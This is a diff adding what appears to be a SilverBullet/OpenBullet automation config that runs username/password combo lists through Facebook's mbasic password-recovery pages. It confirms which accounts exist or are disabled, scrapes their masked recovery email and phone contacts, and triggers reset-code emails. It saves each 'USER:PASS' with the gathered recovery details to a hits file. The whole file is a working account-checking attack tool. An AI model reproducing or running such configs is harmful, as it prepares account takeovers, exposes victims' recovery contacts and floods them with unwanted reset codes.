@@ -1,0 +1,227 @@
+[SETTINGS]
+{
+  "Name": "check code fb 6-8 v3 mbasic",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-01-28T10:23:41.0816817+07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "★𝐂𝐎𝐍𝐅𝐈𝐆 𝐁𝐘 ➥༄@๖ۣۜ𝓐𝓴𝓾༂࿐★ ",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "check code fb 6-8 v3  mbasic",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#userId FUNCTION ToLowercase "<USER>" -> VAR "userId" 
+
+#get REQUEST GET "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&alternate_search=0&toggle_search_mode=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#jazoest PARSE "<SOURCE>" LR "name=\"jazoest\" value=\"" "\"" -> VAR "jazoest" 
+
+#lsd PARSE "<SOURCE>" LR "name=\"lsd\" value=\"" "\"" -> VAR "lsd" 
+
+#search REQUEST POST "https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0" 
+  CONTENT "lsd=<lsd>&jazoest=<jazoest>&email=<userId>&did_submit=Search" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://m.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://m.facebook.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 76" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "cuid" 
+    KEY "account_recovery_initiate_view_label" 
+  KEYCHAIN Failure OR 
+    KEY "login_identify_search_error_msg" 
+  KEYCHAIN Custom "Account Disabled" OR 
+    KEY "Account Disabled" 
+    KEY "Your account has been disabled" 
+
+#cuid PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"cuid\" value=\"" "\"" -> VAR "cuid" 
+
+REQUEST GET "https://mbasic.facebook.com/recover/initiate/?c=%2Flogin%2F&fl=initiate_view&ctx=msite_initiate_view" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Referer: https://mbasic.facebook.com/login/account_recovery/name_search/?cuid=<cuid>&flow=initiate_view&ls=initiate_view&c=%2Flogin%2F&refsrc=deprecated&_rdr" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log in to Google" 
+    KEY "Try entering your password" 
+    KEY "account_recovery_initiate_view_label" 
+    KEY "account_recovery" 
+    KEY "device-based" 
+  KEYCHAIN Retry OR 
+    KEY "Your request couldn't be processed" 
+    KEY "You’re Temporarily Blocked" 
+  KEYCHAIN Custom "Account Disabled" OR 
+    KEY "Account disabled" 
+
+!#device-based REQUEST GET "<ADDRESS>" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" 
+!  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+!  HEADER "Accept-Language: en-US,en;q=0.5" 
+!  HEADER "Referer: https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr" 
+!  HEADER "DNT: 1" 
+!  HEADER "Connection: keep-alive" 
+!  HEADER "Cookie: datr=h1Q-Y5lB7ua23oISEOzyIvXg; sb=h1Q-Yws8uAmr8jDURtuftaiO; sfiu=<COOKIES(sfiu)>" 
+!  HEADER "Upgrade-Insecure-Requests: 1" 
+!  HEADER "Sec-Fetch-Dest: document" 
+!  HEADER "Sec-Fetch-Mode: navigate" 
+!  HEADER "Sec-Fetch-Site: same-origin" 
+!  HEADER "Sec-Fetch-User: ?1" 
+!  HEADER "Accept-Encoding: gzip, deflate" 
+
+#account_recovery PARSE "<SOURCE>" LR "<p id=\"account_recovery_initiate_view_label\">" "</p><" -> VAR "account_recovery" 
+
+IF "<account_recovery>" Contains "Choose a way to reset your password"
+
+#Send_code PARSE "<SOURCE>" LR "email</div><div class=\"bm bn\">" "</div></label" -> VAR "Send code" 
+
+#Send_code FUNCTION HTMLEntityDecode "<Send code>" -> VAR "Send code" 
+
+#Send_code FUNCTION Translate 
+  KEY "</div><div class=\"bm bn\">" VALUE ", " 
+  "<Send code>" -> CAP "Send code" 
+
+#SMS PARSE "<SOURCE>" LR "SMS</div><div class=\"bm bn\">" "</div><" Recursive=TRUE CreateEmpty=FALSE -> CAP "SMS" 
+
+ENDIF
+IF "<account_recovery>" Contains "We can send you a login code"
+
+#Email_1 PARSE "<SOURCE>" LR "send it to" ".</" -> VAR "Email_1" 
+
+#Send_code FUNCTION HTMLEntityDecode "<Email_1>" -> CAP "Send code" 
+
+ENDIF
+IF "<account_recovery>" Contains "Use Your Google Account"
+
+#Email_1 PARSE "<SOURCE>" LR "Send code via email</div><div class=\"bs bt\">" "</div>" -> VAR "Email_1" 
+
+#Send_code FUNCTION HTMLEntityDecode "<Email_1>" -> CAP "Send code" 
+
+ENDIF
+
+#SMS FUNCTION Translate 
+  KEY "<SMS>" VALUE "NO SMS" 
+  "<SMS>" -> CAP "SMS" 
+
+KEYCHECK 
+  KEYCHAIN Custom "Mail ẩn" OR 
+    KEY "<Send code>" DoesNotContain "<userId>" 
+  KEYCHAIN Success OR 
+    KEY "<Send code>" Contains "<userId>" 
+
+#initiate REQUEST GET "https://en-gb.facebook.com/recover/code/?em%5B0%5D=%3CUSER%3E&rm=send_email&c=%2Flogin%2F&hash=AUYVAkd_ePKMY6tTiIo&_rdr" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
+
+#check_code PARSE "<SOURCE>" LR "Please check your emails for a message with your code. Your code is " " numbers long.</" -> VAR "check code" 
+
+IF "<check code>" Contains "6"
+SET CAP "check code" "6"
+ENDIF
+IF "<check code>" Contains "8"
+SET CAP "check code" "8"
+ENDIF
+
+#save UTILITY File "Facebook Valid code <check code>.txt" AppendLines "<USER>:<PASS> | Send code: {Email: [<Send code>] | SMS: <SMS> } | mã <check code> số" 
+
